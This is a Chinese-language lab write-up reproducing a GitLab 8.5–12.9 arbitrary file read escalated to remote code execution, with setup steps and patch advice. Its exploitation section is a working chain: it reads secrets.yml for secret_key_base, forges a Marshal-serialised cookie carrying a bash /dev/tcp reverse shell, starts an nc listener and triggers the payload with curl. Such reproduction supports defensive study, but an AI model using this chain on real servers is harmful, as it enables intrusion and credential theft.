# 0x01 GitLab简介
GitLab 是由GitLabInc.开发，是一个用于仓库管理系统的开源项目，使用MIT许可证的基于网络的Git仓库管理工具，且具有wiki和issue跟踪功能，使用Git作为代码管理工具，并在此基础上搭建起来的web服务。

# 0x02 漏洞概述
在Gitlab 8.5-12.9版本中，存在一处任意文件读取漏洞，攻击者可以利用该漏洞，在不需要特权的状态下，读取任意文件，造成严重信息泄露，从而导致进一步被攻击的风险。

# 0x03 影响版本
- GitLab EE >=8.5，<=12.9

- GitLab CE >=8.5，<=12.9

# 0x04 环境搭建

```
靶机 centos7-1：192.168.50.167
本地gitlab centos7-2：192.168.50.125
本地gitlab ubuntu：192.168.50.227
监听机器 kali：192.168.50.53
```

## 4.1 环境搭建-Centos7

> 靶机测试版本为 gitlab-12.8.7-ce

1.安装依赖软件
```
yum -y install policycoreutils openssh-server openssh-clients postfix
```

2.设置postfix开机自启，并启动，postfix支持gitlab发信功能（对漏洞环境应该不重要）

```
systemctl enable postfix && systemctl start postfix
```

关闭防火墙

```
systemctl stop firewalld.service
```

3.下载gitlab安装包，然后安装

查看当前gitlab版本命令：

```
cat /opt/gitlab/embedded/service/gitlab-rails/VERSION
```

下载rpm包并安装:

```
wget --no-check-certificate  https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/gitlab-ce-12.8.7-ce.0.el7.x86_64.rpm
rpm -i gitlab-ce-12.8.7-ce.0.el7.x86_64.rpm
```

4.修改gitlab配置文件指定服务器ip和自定义端口

```
vim /etc/gitlab/gitlab.rb
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/174458230-57311f56-8e6b-45f4-a484-a80d740ca29c.png" /></div>



5.重置并启动Gitlab

执行以下命令
```
gitlab-ctl reconfigure
gitlab-ctl restart
```

显示成功启动之后，访问端口进入Gitlab页面，提示修改root密码

> PS:若出现502页面，多次刷新页面即可，这是由于Gitlab性能要求比较高，服务器响应慢导致的，推荐虚拟机内存至少分配4G。


## 4.2 环境搭建-Ubuntu
1.安装需要的库和软件
`sudo apt-get install curl openssh-server ca-certificates postfix` 
<div align=center><img src="https://user-images.githubusercontent.com/84888757/174458253-c037967a-1aca-467d-a3f5-49f08a759de3.png" /></div>
<div align=center><img src="https://user-images.githubusercontent.com/84888757/174458254-b587ebd8-bb08-4cd5-af71-314904e51823.png" /></div>

2.下载GitLab的包并进行安装
```
# 下载安装包
wget --content-disposition https://packages.gitlab.com/gitlab/gitlab-ce/packages/ubuntu/xenial/gitlab-ce_12.1.4-ce.0_amd64.deb/download.deb

# 本地安装
dpkg -i gitlab-ce_12.1.4-ce.0_amd64.deb
```

3.配置GitLab
```
vim /etc/gitlab/gitlab.rb
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/174458272-7cf864f2-ee18-4888-8422-febb4841da5a.png" /></div>

4.重置并启动Gitlab
执行以下命令
```
gitlab-ctl reconfigure
gitlab-ctl restart
```

# 0x05 漏洞复现 - 无需用户名和密码

- 🔗 [gitlab_rce.py](https://github.com/dotPY-hax/gitlab_RCE/blob/main/gitlab_rce.py)

## 5.1 任意文件读取
```
python3 gitlab_rce.py http://192.168.50.167:8888/ 192.168.50.53
```
<div align=center><img src="https://user-images.githubusercontent.com/84888757/174458300-bd371dd7-45e5-4c6a-b40f-4ca0afc76bb2.png" /></div>

## 5.2 RCE
1、首先获取`gitlab secret key base`

利用任意文件读取漏洞，下载`/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`文件，获取`secret_key_base`

<div align=center><img src="https://user-images.githubusercontent.com/84888757/174458337-342d9d23-cb4d-4ee4-92a2-9bc1f5af0d8a.png" /></div>

2、本地`centos7-2`搭建gitlab，替换secret_key_base，生成cookie

> 🚩 Ubuntu和centos7作为本地环境，后续命令操作都一样

本地`centos7-2`刚搭建完要记得改配置，重置并启动GitLab。

<div align=center><img src="https://user-images.githubusercontent.com/84888757/174458425-e2b8be24-7ca9-4d59-8c0d-add23a4c83fe.png" /></div>

将目标机下载下来的secerts.yml覆盖在centos7-2攻击机上/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml

（也可以只替换secret_key_base）

然后**不要**再重置并启动Gitlab

3、使用`gitlab-rails console`执行以下命令

（ps：反弹shell的命令必须使用bash -c 包裹，否则反弹不了shell；使用控制台执行这些语句时，系统命令会在本机会执行一遍，所以在以上语句执行完成获取cookie值之前，不要在攻击机上执行监听端口命令）

```
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar
erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/192.168.50.53/7777 0>&1'` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/174458484-7c287448-cbae-4bec-8038-8e1e15f7d033.png" /></div>

4、在攻击机上监听端口

```
nc -lvvp 7777
```

5、构造语句执行命令，反弹shell
```
curl -v 'http://192.168.50.167:8888/users/sign_in' -b "experimentation_subject_id=cookie"
```

> （ps：注意`experimentation_subject_id`参数输入`gitlab-rails console`获取的cookie值）


<div align=center><img src="https://user-images.githubusercontent.com/84888757/174458540-1c4ff2a9-f48a-4c8d-9e2f-a3ef2808826d.png" /></div>


# 0x06 修复建议
官方已在最新版本的GitLab修复了上述漏洞，用户可从官网下载并升级软件到最新版本。

链接：https://packages.gitlab.com/gitlab/gitlab-ce

# 0x07 参考链接
- [Gitlab任意文件读取导致远程命令执行](https://juejin.cn/post/6916343939649765389)
- [Ubuntu安装GitLab 指南](https://blog.csdn.net/u014380491/article/details/122410481)


